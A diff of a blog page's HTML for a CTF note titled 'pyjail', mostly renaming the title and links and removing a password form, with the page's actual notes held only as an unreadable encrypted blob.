@@ -1,17 +1,15 @@
-
 <!DOCTYPE html>
-
 <html class="no-js" lang="zh">
 <head>
 <meta charset="utf-8"/>
 <meta content="width=device-width,initial-scale=1" name="viewport"/>
 <meta content="Darstib's blog!" name="description"/>
-<link href="https://darstib.github.io/blog/CTF/MISC/%F0%9F%94%90%20pyjail/" rel="canonical"/>
+<link href="https://darstib.github.io/blog/CTF/MISC/pyjail/" rel="canonical"/>
 <link href="../info_leak/" rel="prev"/>
 <link href="../qrcode/" rel="next"/>
 <link href="../../../assets/DB.png" rel="icon"/>
 <meta content="mkdocs-1.5.3, mkdocs-material-9.5.13" name="generator"/>
-<title>🔐 pyjail - Darstib's blog!</title>
+<title>pyjail - Darstib's blog!</title>
 <link href="../../../assets/stylesheets/main.7e359304.min.css" rel="stylesheet"/>
 <link href="../../../assets/stylesheets/palette.06af60db.min.css" rel="stylesheet"/>
 <link href="../../../css/heti.css" rel="stylesheet"/>
@@ -25,7 +23,7 @@
 <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
 <script id="__analytics">function __md_analytics(){function n(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],n("js",new Date),n("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&n("event","search",{search_term:this.value})}),document$.subscribe(function(){var a=document.forms.feedback;if(void 0!==a)for(var e of a.querySelectorAll("[type=submit]"))e.addEventListener("click",function(e){e.preventDefault();var t=document.location.pathname,e=this.getAttribute("data-md-value");n("event","feedback",{page:t,data:e}),a.firstElementChild.disabled=!0;e=a.querySelector(".md-feedback__note [data-md-value='"+e+"']");e&&(e.hidden=!1)}),a.hidden=!1}),location$.subscribe(function(e){n("config","G-XXXXXXXXXX",{page_path:e.pathname})})});var e=document.createElement("script");e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX",document.getElementById("__analytics").insertAdjacentElement("afterEnd",e)}</script>
 <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
-<link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><style>
+<link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
     html.glightbox-open { overflow: initial; height: 100%; }
     .gslide-title { margin-top: 0px; user-select: text; }
     .gslide-desc { color: #666; user-select: text; }
@@ -34,7 +32,7 @@
     .gdesc-inner { font-size: 0.75rem; }
     body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
     body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
-    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../assets/javascripts/glightbox.min.js"></script></link></head>
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../assets/javascripts/glightbox.min.js"></script></head>
 <body data-md-color-accent="indigo" data-md-color-primary="grey" data-md-color-scheme="default" dir="ltr">
 <input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
 <input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
@@ -64,7 +62,7 @@
 <div class="md-header__topic" data-md-component="header-topic">
 <span class="md-ellipsis">
             
-              🔐 pyjail
+              pyjail
             
           </span>
 </div>
@@ -330,13 +328,13 @@
 <input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
 <label class="md-nav__link md-nav__link--active" for="__toc">
 <span class="md-ellipsis">
-    🔐 pyjail
+    pyjail
   </span>
 <span class="md-nav__icon md-icon"></span>
 </label>
 <a class="md-nav__link md-nav__link--active" href="./">
 <span class="md-ellipsis">
-    🔐 pyjail
+    pyjail
   </span>
 </a>
 <nav aria-label="目录" class="md-nav md-nav--secondary">
@@ -413,14 +411,6 @@
 <span class="md-nav__icon md-icon"></span>
 </a>
 </li>
-<li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
-<a class="md-nav__link" href="../../../../CTFWP/MOECTF2024/README.md">
-<span class="md-ellipsis">
-    MOECTF2024
-  </span>
-<span class="md-nav__icon md-icon"></span>
-</a>
-</li>
 <li class="md-nav__item">
 <a class="md-nav__link" href="../../LitCTF/LitCTF2024/">
 <span class="md-ellipsis">
@@ -434,13 +424,6 @@
     OTHER
   </span>
 <span class="md-nav__icon md-icon"></span>
-</a>
-</li>
-<li class="md-nav__item">
-<a class="md-nav__link" href="../../../../CTFWP/ZJUBUS/ACTF2016.md">
-<span class="md-ellipsis">
-    ZJUBUS
-  </span>
 </a>
 </li>
 </ul>
@@ -533,34 +516,79 @@
 <nav class="md-tags">
 <a class="md-tag md-tag-icon" href="../../../tags/#notes">notes</a>
 </nav>
-<a class="md-content__button md-icon" href="https://github.com/Darstib/blog/edit/main/docs/CTF/MISC/🔐 pyjail.md" title="编辑此页">
+<a class="md-content__button md-icon" href="https://github.com/Darstib/blog/edit/main/docs/CTF/MISC/pyjail.md" title="编辑此页">
 <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"></path></svg>
 </a>
-<div id="mkdocs-encrypted-content" style="display:none">lj0zoISd1nvry41Kjxxe3A==;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</div>
-<div id="mkdocs-decrypted-content">
-<form class="md-content__inner md-typeset" id="mkdocs-decrypt-form">
-<h1>This content is protected for some reason.</h1>
-<p>真的想看？<a href="https://darstib.github.io/blog/connect_me/">联系我</a></p>
-<input class="md-input" id="mkdocs-content-password" placeholder="Password" type="password"/>
-<p id="mkdocs-decrypt-msg"></p>
-</form>
-</div>
-<script type="text/javascript">
-var encryptcontent_id = "encryptcontent_2";
-var encryptcontent_path = "blog/CTF/MISC/%F0%9F%94%90%20pyjail/";
